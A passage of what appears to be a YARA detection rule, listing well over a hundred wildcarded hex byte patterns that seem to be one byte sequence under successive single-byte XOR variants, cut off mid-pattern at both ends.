2E 2F 2D ?? ?? 2F 2D 2F 2E 2F 2D ?? ?? 2F 2C 2F 2D 2F 2B ?? ?? ?? ?? 2F 2B 2F 2D 2F 2B ?? ?? ?? ?? 2F 2A 2F 2E 2F 2D ?? ?? } $s048 = { 30 31 30 31 30 32 ?? ?? 30 32 30 31 30 32 ?? ?? 30 33 30 32 30 34 ?? ?? ?? ?? 30 34 30 32 30 34 ?? ?? ?? ?? 30 35 30 31 30 32 ?? ?? } $s049 = { 31 30 31 30 31 33 ?? ?? 31 33 31 30 31 33 ?? ?? 31 32 31 33 31 35 ?? ?? ?? ?? 31 35 31 33 31 35 ?? ?? ?? ?? 31 34 31 30 31 33 ?? ?? } $s050 = { 32 33 32 33 32 30 ?? ?? 32 30 32 33 32 30 ?? ?? 32 31 32 30 32 36 ?? ?? ?? ?? 32 36 32 30 32 36 ?? ?? ?? ?? 32 37 32 33 32 30 ?? ?? } $s051 = { 33 32 33 32 33 31 ?? ?? 33 31 33 32 33 31 ?? ?? 33 30 33 31 33 37 ?? ?? ?? ?? 33 37 33 31 33 37 ?? ?? ?? ?? 33 36 33 32 33 31 ?? ?? } $s052 = { 34 35 34 35 34 36 ?? ?? 34 36 34 35 34 36 ?? ?? 34 37 34 36 34 30 ?? ?? ?? ?? 34 30 34 36 34 30 ?? ?? ?? ?? 34 31 34 35 34 36 ?? ?? } $s053 = { 35 34 35 34 35 37 ?? ?? 35 37 35 34 35 37 ?? ?? 35 36 35 37 35 31 ?? ?? ?? ?? 35 31 35 37 35 31 ?? ?? ?? ?? 35 30 35 34 35 37 ?? ?? } $s054 = { 36 37 36 37 36 34 ?? ?? 36 34 36 37 36 34 ?? ?? 36 35 36 34 36 32 ?? ?? ?? ?? 36 32 36 34 36 32 ?? ?? ?? ?? 36 33 36 37 36 34 ?? ?? } $s055 = { 37 36 37 36 37 35 ?? ?? 37 35 37 36 37 35 ?? ?? 37 34 37 35 37 33 ?? ?? ?? ?? 37 33 37 35 37 33 ?? ?? ?? ?? 37 32 37 36 37 35 ?? ?? } $s056 = { 38 39 38 39 38 3A ?? ?? 38 3A 38 39 38 3A ?? ?? 38 3B 38 3A 38 3C ?? ?? ?? ?? 38 3C 38 3A 38 3C ?? ?? ?? ?? 38 3D 38 39 38 3A ?? ?? } $s057 = { 39 38 39 38 39 3B ?? ?? 39 3B 39 38 39 3B ?? ?? 39 3A 39 3B 39 3D ?? ?? ?? ?? 39 3D 39 3B 39 3D ?? ?? ?? ?? 39 3C 39 38 39 3B ?? ?? } $s058 = { 3A 3B 3A 3B 3A 38 ?? ?? 3A 38 3A 3B 3A 38 ?? ?? 3A 39 3A 38 3A 3E ?? ?? ?? ?? 3A 3E 3A 38 3A 3E ?? ?? ?? ?? 3A 3F 3A 3B 3A 38 ?? ?? } $s059 = { 3B 3A 3B 3A 3B 39 ?? ?? 3B 39 3B 3A 3B 39 ?? ?? 3B 38 3B 39 3B 3F ?? ?? ?? ?? 3B 3F 3B 39 3B 3F ?? ?? ?? ?? 3B 3E 3B 3A 3B 39 ?? ?? } $s060 = { 3C 3D 3C 3D 3C 3E ?? ?? 3C 3E 3C 3D 3C 3E ?? ?? 3C 3F 3C 3E 3C 38 ?? ?? ?? ?? 3C 38 3C 3E 3C 38 ?? ?? ?? ?? 3C 39 3C 3D 3C 3E ?? ?? } $s061 = { 3D 3C 3D 3C 3D 3F ?? ?? 3D 3F 3D 3C 3D 3F ?? ?? 3D 3E 3D 3F 3D 39 ?? ?? ?? ?? 3D 39 3D 3F 3D 39 ?? ?? ?? ?? 3D 38 3D 3C 3D 3F ?? ?? } $s062 = { 3E 3F 3E 3F 3E 3C ?? ?? 3E 3C 3E 3F 3E 3C ?? ?? 3E 3D 3E 3C 3E 3A ?? ?? ?? ?? 3E 3A 3E 3C 3E 3A ?? ?? ?? ?? 3E 3B 3E 3F 3E 3C ?? ?? } $s063 = { 3F 3E 3F 3E 3F 3D ?? ?? 3F 3D 3F 3E 3F 3D ?? ?? 3F 3C 3F 3D 3F 3B ?? ?? ?? ?? 3F 3B 3F 3D 3F 3B ?? ?? ?? ?? 3F 3A 3F 3E 3F 3D ?? ?? } $s064 = { 40 41 40 41 40 42 ?? ?? 40 42 40 41 40 42 ?? ?? 40 43 40 42 40 44 ?? ?? ?? ?? 40 44 40 42 40 44 ?? ?? ?? ?? 40 45 40 41 40 42 ?? ?? } $s065 = { 41 40 41 40 41 43 ?? ?? 41 43 41 40 41 43 ?? ?? 41 42 41 43 41 45 ?? ?? ?? ?? 41 45 41 43 41 45 ?? ?? ?? ?? 41 44 41 40 41 43 ?? ?? } $s066 = { 42 43 42 43 42 40 ?? ?? 42 40 42 43 42 40 ?? ?? 42 41 42 40 42 46 ?? ?? ?? ?? 42 46 42 40 42 46 ?? ?? ?? ?? 42 47 42 43 42 40 ?? ?? } $s067 = { 43 42 43 42 43 41 ?? ?? 43 41 43 42 43 41 ?? ?? 43 40 43 41 43 47 ?? ?? ?? ?? 43 47 43 41 43 47 ?? ?? ?? ?? 43 46 43 42 43 41 ?? ?? } $s068 = { 44 45 44 45 44 46 ?? ?? 44 46 44 45 44 46 ?? ?? 44 47 44 46 44 40 ?? ?? ?? ?? 44 40 44 46 44 40 ?? ?? ?? ?? 44 41 44 45 44 46 ?? ?? } $s069 = { 45 44 45 44 45 47 ?? ?? 45 47 45 44 45 47 ?? ?? 45 46 45 47 45 41 ?? ?? ?? ?? 45 41 45 47 45 41 ?? ?? ?? ?? 45 40 45 44 45 47 ?? ?? } $s070 = { 46 47 46 47 46 44 ?? ?? 46 44 46 47 46 44 ?? ?? 46 45 46 44 46 42 ?? ?? ?? ?? 46 42 46 44 46 42 ?? ?? ?? ?? 46 43 46 47 46 44 ?? ?? } $s071 = { 47 46 47 46 47 45 ?? ?? 47 45 47 46 47 45 ?? ?? 47 44 47 45 47 43 ?? ?? ?? ?? 47 43 47 45 47 43 ?? ?? ?? ?? 47 42 47 46 47 45 ?? ?? } $s072 = { 48 49 48 49 48 4A ?? ?? 48 4A 48 49 48 4A ?? ?? 48 4B 48 4A 48 4C ?? ?? ?? ?? 48 4C 48 4A 48 4C ?? ?? ?? ?? 48 4D 48 49 48 4A ?? ?? } $s073 = { 49 48 49 48 49 4B ?? ?? 49 4B 49 48 49 4B ?? ?? 49 4A 49 4B 49 4D ?? ?? ?? ?? 49 4D 49 4B 49 4D ?? ?? ?? ?? 49 4C 49 48 49 4B ?? ?? } $s074 = { 4A 4B 4A 4B 4A 48 ?? ?? 4A 48 4A 4B 4A 48 ?? ?? 4A 49 4A 48 4A 4E ?? ?? ?? ?? 4A 4E 4A 48 4A 4E ?? ?? ?? ?? 4A 4F 4A 4B 4A 48 ?? ?? } $s075 = { 4B 4A 4B 4A 4B 49 ?? ?? 4B 49 4B 4A 4B 49 ?? ?? 4B 48 4B 49 4B 4F ?? ?? ?? ?? 4B 4F 4B 49 4B 4F ?? ?? ?? ?? 4B 4E 4B 4A 4B 49 ?? ?? } $s076 = { 4C 4D 4C 4D 4C 4E ?? ?? 4C 4E 4C 4D 4C 4E ?? ?? 4C 4F 4C 4E 4C 48 ?? ?? ?? ?? 4C 48 4C 4E 4C 48 ?? ?? ?? ?? 4C 49 4C 4D 4C 4E ?? ?? } $s077 = { 4D 4C 4D 4C 4D 4F ?? ?? 4D 4F 4D 4C 4D 4F ?? ?? 4D 4E 4D 4F 4D 49 ?? ?? ?? ?? 4D 49 4D 4F 4D 49 ?? ?? ?? ?? 4D 48 4D 4C 4D 4F ?? ?? } $s078 = { 4E 4F 4E 4F 4E 4C ?? ?? 4E 4C 4E 4F 4E 4C ?? ?? 4E 4D 4E 4C 4E 4A ?? ?? ?? ?? 4E 4A 4E 4C 4E 4A ?? ?? ?? ?? 4E 4B 4E 4F 4E 4C ?? ?? } $s079 = { 4F 4E 4F 4E 4F 4D ?? ?? 4F 4D 4F 4E 4F 4D ?? ?? 4F 4C 4F 4D 4F 4B ?? ?? ?? ?? 4F 4B 4F 4D 4F 4B ?? ?? ?? ?? 4F 4A 4F 4E 4F 4D ?? ?? } $s080 = { 50 51 50 51 50 52 ?? ?? 50 52 50 51 50 52 ?? ?? 50 53 50 52 50 54 ?? ?? ?? ?? 50 54 50 52 50 54 ?? ?? ?? ?? 50 55 50 51 50 52 ?? ?? } $s081 = { 51 50 51 50 51 53 ?? ?? 51 53 51 50 51 53 ?? ?? 51 52 51 53 51 55 ?? ?? ?? ?? 51 55 51 53 51 55 ?? ?? ?? ?? 51 54 51 50 51 53 ?? ?? } $s082 = { 52 53 52 53 52 50 ?? ?? 52 50 52 53 52 50 ?? ?? 52 51 52 50 52 56 ?? ?? ?? ?? 52 56 52 50 52 56 ?? ?? ?? ?? 52 57 52 53 52 50 ?? ?? } $s083 = { 53 52 53 52 53 51 ?? ?? 53 51 53 52 53 51 ?? ?? 53 50 53 51 53 57 ?? ?? ?? ?? 53 57 53 51 53 57 ?? ?? ?? ?? 53 56 53 52 53 51 ?? ?? } $s084 = { 54 55 54 55 54 56 ?? ?? 54 56 54 55 54 56 ?? ?? 54 57 54 56 54 50 ?? ?? ?? ?? 54 50 54 56 54 50 ?? ?? ?? ?? 54 51 54 55 54 56 ?? ?? } $s085 = { 55 54 55 54 55 57 ?? ?? 55 57 55 54 55 57 ?? ?? 55 56 55 57 55 51 ?? ?? ?? ?? 55 51 55 57 55 51 ?? ?? ?? ?? 55 50 55 54 55 57 ?? ?? } $s086 = { 56 57 56 57 56 54 ?? ?? 56 54 56 57 56 54 ?? ?? 56 55 56 54 56 52 ?? ?? ?? ?? 56 52 56 54 56 52 ?? ?? ?? ?? 56 53 56 57 56 54 ?? ?? } $s087 = { 57 56 57 56 57 55 ?? ?? 57 55 57 56 57 55 ?? ?? 57 54 57 55 57 53 ?? ?? ?? ?? 57 53 57 55 57 53 ?? ?? ?? ?? 57 52 57 56 57 55 ?? ?? } $s088 = { 58 59 58 59 58 5A ?? ?? 58 5A 58 59 58 5A ?? ?? 58 5B 58 5A 58 5C ?? ?? ?? ?? 58 5C 58 5A 58 5C ?? ?? ?? ?? 58 5D 58 59 58 5A ?? ?? } $s089 = { 59 58 59 58 59 5B ?? ?? 59 5B 59 58 59 5B ?? ?? 59 5A 59 5B 59 5D ?? ?? ?? ?? 59 5D 59 5B 59 5D ?? ?? ?? ?? 59 5C 59 58 59 5B ?? ?? } $s090 = { 5A 5B 5A 5B 5A 58 ?? ?? 5A 58 5A 5B 5A 58 ?? ?? 5A 59 5A 58 5A 5E ?? ?? ?? ?? 5A 5E 5A 58 5A 5E ?? ?? ?? ?? 5A 5F 5A 5B 5A 58 ?? ?? } $s091 = { 5B 5A 5B 5A 5B 59 ?? ?? 5B 59 5B 5A 5B 59 ?? ?? 5B 58 5B 59 5B 5F ?? ?? ?? ?? 5B 5F 5B 59 5B 5F ?? ?? ?? ?? 5B 5E 5B 5A 5B 59 ?? ?? } $s092 = { 5C 5D 5C 5D 5C 5E ?? ?? 5C 5E 5C 5D 5C 5E ?? ?? 5C 5F 5C 5E 5C 58 ?? ?? ?? ?? 5C 58 5C 5E 5C 58 ?? ?? ?? ?? 5C 59 5C 5D 5C 5E ?? ?? } $s093 = { 5D 5C 5D 5C 5D 5F ?? ?? 5D 5F 5D 5C 5D 5F ?? ?? 5D 5E 5D 5F 5D 59 ?? ?? ?? ?? 5D 59 5D 5F 5D 59 ?? ?? ?? ?? 5D 58 5D 5C 5D 5F ?? ?? } $s094 = { 5E 5F 5E 5F 5E 5C ?? ?? 5E 5C 5E 5F 5E 5C ?? ?? 5E 5D 5E 5C 5E 5A ?? ?? ?? ?? 5E 5A 5E 5C 5E 5A ?? ?? ?? ?? 5E 5B 5E 5F 5E 5C ?? ?? } $s095 = { 5F 5E 5F 5E 5F 5D ?? ?? 5F 5D 5F 5E 5F 5D ?? ?? 5F 5C 5F 5D 5F 5B ?? ?? ?? ?? 5F 5B 5F 5D 5F 5B ?? ?? ?? ?? 5F 5A 5F 5E 5F 5D ?? ?? } $s096 = { 60 61 60 61 60 62 ?? ?? 60 62 60 61 60 62 ?? ?? 60 63 60 62 60 64 ?? ?? ?? ?? 60 64 60 62 60 64 ?? ?? ?? ?? 60 65 60 61 60 62 ?? ?? } $s097 = { 61 60 61 60 61 63 ?? ?? 61 63 61 60 61 63 ?? ?? 61 62 61 63 61 65 ?? ?? ?? ?? 61 65 61 63 61 65 ?? ?? ?? ?? 61 64 61 60 61 63 ?? ?? } $s098 = { 62 63 62 63 62 60 ?? ?? 62 60 62 63 62 60 ?? ?? 62 61 62 60 62 66 ?? ?? ?? ?? 62 66 62 60 62 66 ?? ?? ?? ?? 62 67 62 63 62 60 ?? ?? } $s099 = { 63 62 63 62 63 61 ?? ?? 63 61 63 62 63 61 ?? ?? 63 60 63 61 63 67 ?? ?? ?? ?? 63 67 63 61 63 67 ?? ?? ?? ?? 63 66 63 62 63 61 ?? ?? } $s100 = { 64 65 64 65 64 66 ?? ?? 64 66 64 65 64 66 ?? ?? 64 67 64 66 64 60 ?? ?? ?? ?? 64 60 64 66 64 60 ?? ?? ?? ?? 64 61 64 65 64 66 ?? ?? } $s101 = { 65 64 65 64 65 67 ?? ?? 65 67 65 64 65 67 ?? ?? 65 66 65 67 65 61 ?? ?? ?? ?? 65 61 65 67 65 61 ?? ?? ?? ?? 65 60 65 64 65 67 ?? ?? } $s102 = { 66 67 66 67 66 64 ?? ?? 66 64 66 67 66 64 ?? ?? 66 65 66 64 66 62 ?? ?? ?? ?? 66 62 66 64 66 62 ?? ?? ?? ?? 66 63 66 67 66 64 ?? ?? } $s103 = { 67 66 67 66 67 65 ?? ?? 67 65 67 66 67 65 ?? ?? 67 64 67 65 67 63 ?? ?? ?? ?? 67 63 67 65 67 63 ?? ?? ?? ?? 67 62 67 66 67 65 ?? ?? } $s104 = { 68 69 68 69 68 6A ?? ?? 68 6A 68 69 68 6A ?? ?? 68 6B 68 6A 68 6C ?? ?? ?? ?? 68 6C 68 6A 68 6C ?? ?? ?? ?? 68 6D 68 69 68 6A ?? ?? } $s105 = { 69 68 69 68 69 6B ?? ?? 69 6B 69 68 69 6B ?? ?? 69 6A 69 6B 69 6D ?? ?? ?? ?? 69 6D 69 6B 69 6D ?? ?? ?? ?? 69 6C 69 68 69 6B ?? ?? } $s106 = { 6A 6B 6A 6B 6A 68 ?? ?? 6A 68 6A 6B 6A 68 ?? ?? 6A 69 6A 68 6A 6E ?? ?? ?? ?? 6A 6E 6A 68 6A 6E ?? ?? ?? ?? 6A 6F 6A 6B 6A 68 ?? ?? } $s107 = { 6B 6A 6B 6A 6B 69 ?? ?? 6B 69 6B 6A 6B 69 ?? ?? 6B 68 6B 69 6B 6F ?? ?? ?? ?? 6B 6F 6B 69 6B 6F ?? ?? ?? ?? 6B 6E 6B 6A 6B 69 ?? ?? } $s108 = { 6C 6D 6C 6D 6C 6E ?? ?? 6C 6E 6C 6D 6C 6E ?? ?? 6C 6F 6C 6E 6C 68 ?? ?? ?? ?? 6C 68 6C 6E 6C 68 ?? ?? ?? ?? 6C 69 6C 6D 6C 6E ?? ?? } $s109 = { 6D 6C 6D 6C 6D 6F ?? ?? 6D 6F 6D 6C 6D 6F ?? ?? 6D 6E 6D 6F 6D 69 ?? ?? ?? ?? 6D 69 6D 6F 6D 69 ?? ?? ?? ?? 6D 68 6D 6C 6D 6F ?? ?? } $s110 = { 6E 6F 6E 6F 6E 6C ?? ?? 6E 6C 6E 6F 6E 6C ?? ?? 6E 6D 6E 6C 6E 6A ?? ?? ?? ?? 6E 6A 6E 6C 6E 6A ?? ?? ?? ?? 6E 6B 6E 6F 6E 6C ?? ?? } $s111 = { 6F 6E 6F 6E 6F 6D ?? ?? 6F 6D 6F 6E 6F 6D ?? ?? 6F 6C 6F 6D 6F 6B ?? ?? ?? ?? 6F 6B 6F 6D 6F 6B ?? ?? ?? ?? 6F 6A 6F 6E 6F 6D ?? ?? } $s112 = { 70 71 70 71 70 72 ?? ?? 70 72 70 71 70 72 ?? ?? 70 73 70 72 70 74 ?? ?? ?? ?? 70 74 70 72 70 74 ?? ?? ?? ?? 70 75 70 71 70 72 ?? ?? } $s113 = { 71 70 71 70 71 73 ?? ?? 71 73 71 70 71 73 ?? ?? 71 72 71 73 71 75 ?? ?? ?? ?? 71 75 71 73 71 75 ?? ?? ?? ?? 71 74 71 70 71 73 ?? ?? } $s114 = { 72 73 72 73 72 70 ?? ?? 72 70 72 73 72 70 ?? ?? 72 71 72 70 72 76 ?? ?? ?? ?? 72 76 72 70 72 76 ?? ?? ?? ?? 72 77 72 73 72 70 ?? ?? } $s115 = { 73 72 73 72 73 71 ?? ?? 73 71 73 72 73 71 ?? ?? 73 70 73 71 73 77 ?? ?? ?? ?? 73 77 73 71 73 77 ?? ?? ?? ?? 73 76 73 72 73 71 ?? ?? } $s116 = { 74 75 74 75 74 76 ?? ?? 74 76 74 75 74 76 ?? ?? 74 77 74 76 74 70 ?? ?? ?? ?? 74 70 74 76 74 70 ?? ?? ?? ?? 74 71 74 75 74 76 ?? ?? } $s117 = { 75 74 75 74 75 77 ?? ?? 75 77 75 74 75 77 ?? ?? 75 76 75 77 75 71 ?? ?? ?? ?? 75 71 75 77 75 71 ?? ?? ?? ?? 75 70 75 74 75 77 ?? ?? } $s118 = { 76 77 76 77 76 74 ?? ?? 76 74 76 77 76 74 ?? ?? 76 75 76 74 76 72 ?? ?? ?? ?? 76 72 76 74 76 72 ?? ?? ?? ?? 76 73 76 77 76 74 ?? ?? } $s119 = { 77 76 77 76 77 75 ?? ?? 77 75 77 76 77 75 ?? ?? 77 74 77 75 77 73 ?? ?? ?? ?? 77 73 77 75 77 73 ?? ?? ?? ?? 77 72 77 76 77 75 ?? ?? } $s120 = { 78 79 78 79 78 7A ?? ?? 78 7A 78 79 78 7A ?? ?? 78 7B 78 7A 78 7C ?? ?? ?? ?? 78 7C 78 7A 78 7C ?? ?? ?? ?? 78 7D 78 79 78 7A ?? ?? } $s121 = { 79 78 79 78 79 7B ?? ?? 79 7B 79 78 79 7B ?? ?? 79 7A 79 7B 79 7D ?? ?? ?? ?? 79 7D 79 7B 79 7D ?? ?? ?? ?? 79 7C 79 78 79 7B ?? ?? } $s122 = { 7A 7B 7A 7B 7A 78 ?? ?? 7A 78 7A 7B 7A 78 ?? ?? 7A 79 7A 78 7A 7E ?? ?? ?? ?? 7A 7E 7A 78 7A 7E ?? ?? ?? ?? 7A 7F 7A 7B 7A 78 ?? ?? } $s123 = { 7B 7A 7B 7A 7B 79 ?? ?? 7B 79 7B 7A 7B 79 ?? ?? 7B 78 7B 79 7B 7F ?? ?? ?? ?? 7B 7F 7B 79 7B 7F ?? ?? ?? ?? 7B 7E 7B 7A 7B 79 ?? ?? } $s124 = { 7C 7D 7C 7D 7C 7E ?? ?? 7C 7E 7C 7D 7C 7E ?? ?? 7C 7F 7C 7E 7C 78 ?? ?? ?? ?? 7C 78 7C 7E 7C 78 ?? ?? ?? ?? 7C 79 7C 7D 7C 7E ?? ?? } $s125 = { 7D 7C 7D 7C 7D 7F ?? ?? 7D 7F 7D 7C 7D 7F ?? ?? 7D 7E 7D 7F 7D 79 ?? ?? ?? ?? 7D 79 7D 7F 7D 79 ?? ?? ?? ?? 7D 78 7D 7C 7D 7F ?? ?? } $s126 = { 7E 7F 7E 7F 7E 7C ?? ?? 7E 7C 7E 7F 7E 7C ?? ?? 7E 7D 7E 7C 7E 7A ?? ?? ?? ?? 7E 7A 7E 7C 7E 7A ?? ?? ?? ?? 7E 7B 7E 7F 7E 7C ?? ?? } $s127 = { 7F 7E 7F 7E 7F 7D ?? ?? 7F 7D 7F 7E 7F 7D ?? ?? 7F 7C 7F 7D 7F 7B ?? ?? ?? ?? 7F 7B 7F 7D 7F 7B ?? ?? ?? ?? 7F 7A 7F 7E 7F 7D ?? ?? } $s128 = { 80 81 80 81 80 82 ?? ?? 80 82 80 81 80 82 ?? ?? 80 83 80 82 80 84 ?? ?? ?? ?? 80 84 80 82 80 84 ?? ?? ?? ?? 80 85 80 81 80 82 ?? ?? } $s129 = { 81 80 81 80 81 83 ?? ?? 81 83 81 80 81 83 ?? ?? 81 82 81 83 81 85 ?? ?? ?? ?? 81 85 81 83 81 85 ?? ?? ?? ?? 81 84 81 80 81 83 ?? ?? } $s130 = { 82 83 82 83 82 80 ?? ?? 82 80 82 83 82 80 ?? ?? 82 81 82 80 82 86 ?? ?? ?? ?? 82 86 82 80 82 86 ?? ?? ?? ?? 82 87 82 83 82 80 ?? ?? } $s131 = { 83 82 83 82 83 81 ?? ?? 83 81 83 82 83 81 ?? ?? 83 80 83 81 83 87 ?? ?? ?? ?? 83 87 83 81 83 87 ?? ?? ?? ?? 83 86 83 82 83 81 ?? ?? } $s132 = { 84 85 84 85 84 86 ?? ?? 84 86 84 85 84 86 ?? ?? 84 87 84 86 84 80 ?? ?? ?? ?? 84 80 84 86 84 80 ?? ?? ?? ?? 84 81 84 85 84 86 ?? ?? } $s133 = { 85 84 85 84 85 87 ?? ?? 85 87 85 84 85 87 ?? ?? 85 86 85 87 85 81 ?? ?? ?? ?? 85 81 85 87 85 81 ?? ?? ?? ?? 85 80 85 84 85 87 ?? ?? } $s134 = { 86 87 86 87 86 84 ?? ?? 86 84 86 87 86 84 ?? ?? 86 85 86 84 86 82 ?? ?? ?? ?? 86 82 86 84 86 82 ?? ?? ?? ?? 86 83 86 87 86 84 ?? ?? } $s135 = { 87 86 87 86 87 85 ?? ?? 87 85 87 86 87 85 ?? ?? 87 84 87 85 87 83 ?? ?? ?? ?? 87 83 87 85 87 83 ?? ?? ?? ?? 87 82 87 86 87 85 ?? ?? } $s136 = { 88 89 88 89 88 8A ?? ?? 88 8A 88 89 88 8A ?? ?? 88 8B 88 8A 88 8C ?? ?? ?? ?? 88 8C 88 8A 88 8C ?? ?? ?? ?? 88 8D 88 89 88 8A ?? ?? } $s137 = { 89 88 89 88 89 8B ?? ?? 89 8B 89 88 89 8B ?? ?? 89 8A 89 8B 89 8D ?? ?? ?? ?? 89 8D 89 8B 89 8D ?? ?? ?? ?? 89 8C 89 88 89 8B ?? ?? } $s138 = { 8A 8B 8A 8B 8A 88 ?? ?? 8A 88 8A 8B 8A 88 ?? ?? 8A 89 8A 88 8A 8E ?? ?? ?? ?? 8A 8E 8A 88 8A 8E ?? ?? ?? ?? 8A 8F 8A 8B 8A 88 ?? ?? } $s139 = { 8B 8A 8B 8A 8B 89 ?? ?? 8B 89 8B 8A 8B 89 ?? ?? 8B 88 8B 89 8B 8F ?? ?? ?? ?? 8B 8F 8B 89 8B 8F ?? ?? ?? ?? 8B 8E 8B 8A 8B 89 ?? ?? } $s140 = { 8C 8D 8C 8D 8C 8E ?? ?? 8C 8E 8C 8D 8C 8E ?? ?? 8C 8F 8C 8E 8C 88 ?? ?? ?? ?? 8C 88 8C 8E 8C 88 ?? ?? ?? ?? 8C 89 8C 8D 8C 8E ?? ?? } $s141 = { 8D 8C 8D 8C 8D 8F ?? ?? 8D 8F 8D 8C 8D 8F ?? ?? 8D 8E 8D 8F 8D 89 ?? ?? ?? ?? 8D 89 8D 8F 8D 89 ?? ?? ?? ?? 8D 88 8D 8C 8D 8F ?? ?? } $s142 = { 8E 8F 8E 8F 8E 8C ?? ?? 8E 8C 8E 8F 8E 8C ?? ?? 8E 8D 8E 8C 8E 8A ?? ?? ?? ?? 8E 8A 8E 8C 8E 8A ?? ?? ?? ?? 8E 8B 8E 8F 8E 8C ?? ?? } $s143 = { 8F 8E 8F 8E 8F 8D ?? ?? 8F 8D 8F 8E 8F 8D ?? ?? 8F 8C 8F 8D 8F 8B ?? ?? ?? ?? 8F 8B 8F 8D 8F 8B ?? ?? ?? ?? 8F 8A 8F 8E 8F 8D ?? ?? } $s144 = { 90 91 90 91 90 92 ?? ?? 90 92 90 91 90 92 ?? ?? 90 93 90 92 90 94 ?? ?? ?? ?? 90 94 90 92 90 94 ?? ?? ?? ?? 90 95 90 91 90 92 ?? ?? } $s145 = { 91 90 91 90 91 93 ?? ?? 91 93 91 90 91 93 ?? ?? 91 92 91 93 91 95 ?? ?? ?? ?? 91 95 91 93 91 95 ?? ?? ?? ?? 91 94 91 90 91 93 ?? ?? } $s146 = { 92 93 92 93 92 90 ?? ?? 92 90 92 93 92 90 ?? ?? 92 91 92 90 92 96 ?? ?? ?? ?? 92 96 92 90 92 96 ?? ?? ?? ?? 92 97 92 93 92 90 ?? ?? } $s147 = { 93 92 93 92 93 91 ?? ?? 93 91 93 92 93 91 ?? ?? 93 90 93 91 93 97 ?? ?? ?? ?? 93 97 93 91 93 97 ?? ?? ?? ?? 93 96 93 92 93 91 ?? ?? } $s148 = { 94 95 94 95 94 96 ?? ?? 94 96 94 95 94 96 ?? ?? 94 97 94 96 94 90 ?? ?? ?? ?? 94 90 94 96 94 90 ?? ?? ?? ?? 94 91 94 95 94 96 ?? ?? } $s149 = { 95 94 95 94 95 97 ?? ?? 95 97 95 94 95 97 ?? ?? 95 96 95 97 95 91 ?? ?? ?? ?? 95 91 95 97 95 91 ?? ?? ?? ?? 95 90 95 94 95 97 ?? ?? } $s150 = { 96 97 96 97 96 94 ?? ?? 96 94 96 97 96 94 ?? ?? 96 95 96 94 96 92 ?? ?? ?? ?? 96 92 96 94 96 92 ?? ?? ?? ?? 96 93 96 97 96 94 ?? ?? } $s151 = { 97 96 97 96 97 95 ?? ?? 97 95 97 96 97 95 ?? ?? 97 94 97 95 97 93 ?? ?? ?? ?? 97 93 97 95 97 93 ?? ?? ?? ?? 97 92 97 96 97 95 ?? ?? } $s152 = { 98 99 98 99 98 9A ?? ?? 98 9A 98 99 98 9A ?? ?? 98 9B 98 9A 98 9C ?? ?? ?? ?? 98 9C 98 9A 98 9C ?? ?? ?? ?? 98 9D 98 99 98 9A ?? ?? } $s153 = { 99 98 99 98 99 9B ?? ?? 99 9B 99 98 99 9B ?? ?? 99 9A 99 9B 99 9D ?? ?? ?? ?? 99 9D 99 9B 99 9D ?? ?? ?? ?? 99 9C 99 98 99 9B ?? ?? } $s154 = { 9A 9B 9A 9B 9A 98 ?? ?? 9A 98 9A 9B 9A 98 ?? ?? 9A 99 9A 98 9A 9E ?? ?? ?? ?? 9A 9E 9A 98 9A 9E ?? ?? ?? ?? 9A 9F 9A 9B 9A 98 ?? ?? } $s155 = { 9B 9A 9B 9A 9B 99 ?? ?? 9B 99 9B 9A 9B 99 ?? ?? 9B 98 9B 99 9B 9F ?? ?? ?? ?? 9B 9F 9B 99 9B 9F ?? ?? ?? ?? 9B 9E 9B 9A 9B 99 ?? ?? } $s156 = { 9C 9D 9C 9D 9C 9E ?? ?? 9C 9E 9C 9D 9C 9E ?? ?? 9C 9F 9C 9E 9C 98 ?? ?? ?? ?? 9C 98 9C 9E 9C 98 ?? ?? ?? ?? 9C 99 9C 9D 9C 9E ?? ?? } $s157 = { 9D 9C 9D 9C 9D 9F ?? ?? 9D 9F 9D 9C 9D 9F ?? ?? 9D 9E 9D 9F 9D 99 ?? ?? ?? ?? 9D 99 9D 9F 9D 99 ?? ?? ?? ?? 9D 98 9D 9C 9D 9F ?? ?? } $s158 = { 9E 9F 9E 9F 9E 9C ?? ?? 9E 9C 9E 9F 9E 9C ?? ?? 9E 9D 9E 9C 9E 9A ?? ?? ?? ?? 9E 9A 9E 9C 9E 9A ?? ?? ?? ?? 9E 9B 9E 9F 9E 9C ?? ?? } $s159 = { 9F 9E 9F 9E 9F 9D ?? ?? 9F 9D 9F 9E 9F 9D ?? ?? 9F 9C 9F 9D 9F 9B ?? ?? ?? ?? 9F 9B 9F 9D 9F 9B ?? ?? ?? ?? 9F 9A 9F 9E 9F 9D ?? ?? } $s160 = { A0 A1 A0 A1 A0 A2 ?? ?? A0 A2 A0 A1 A0 A2 ?? ?? A0 A3 A0 A2 A0 A4 ?? ?? ?? ?? A0 A4 A0 A2 A0 A4 ?? ?? ?? ?? A0 A5 A0 A1 A0 A2 ?? ?? } $s161 = { A1 A0 A1 A0 A1 A3 ?? ?? A1 A3 A1 A0 A1 A3 ?? ?? A1 A2 A1 A3 A1 A5 ?? ?? ?? ?? A1 A5 A1 A3 A1 A5 ?? ?? ?? ?? A1 A4 A1 A0 A1 A3 ?? ?? } $s162 = { A2 A3 A2 A3 A2 A0 ?? ?? A2 A0 A2 A3 A2 A0 ?? ?? A2 A1 A2 A0 A2 A6 ?? ?? ?? ?? A2 A6 A2 A0 A2 A6 ?? ?? ?? ?? A2 A7 A2 A3 A2 A0 ?? ?? } $s163 = { A3 A2 A3 A2 A3 A1 ?? ?? A3 A1 A3 A2 A3 A1 ?? ?? A3 A0 A3 A1 A3 A7 ?? ?? ?? ?? A3 A7 A3 A1 A3 A7 ?? ?? ?? ?? A3 A6 A3 A2 A3 A1 ?? ?? } $s164 = { A4 A5 A4 A5 A4 A6 ?? ?? A4 A6 A4 A5 A4 A6 ?? ?? A4 A7 A4 A6 A4 A0 ?? ?? ?? ?? A4 A0 A4 A6 A4 A0 ?? ?? ?? ?? A4 A1 A4 A5 A4 A6 ?? ?? } $s165 = { A5 A4 A5 A4 A5 A7 ?? ?? A5 A7 A5 A4 A5 A7 ?? ?? A5 A6 A5 A7 A5 A1 ?? ?? ?? ?? A5 A1 A5 A7 A5 A1 ?? ?? ?? ?? A5 A0 A5 A4 A5 A7 ?? ?? } $s166 = { A6 A7 A6 A7 A6 A4 ?? ?? A6 A4 A6 A7 A6 A4 ?? ?? A6 A5 A6 A4 A6 A2 ?? ?? ?? ?? A6 A2 A6 A4 A6 A2 ?? ?? ?? ?? A6 A3 A6 A7 A6 A4 ?? ?? } $s167 = { A7 A6 A7 A6 A7 A5 ?? ?? A7 A5 A7 A6 A7 A5 ?? ?? A7 A4 A7 A5 A7 A3 ?? ?? ?? ?? 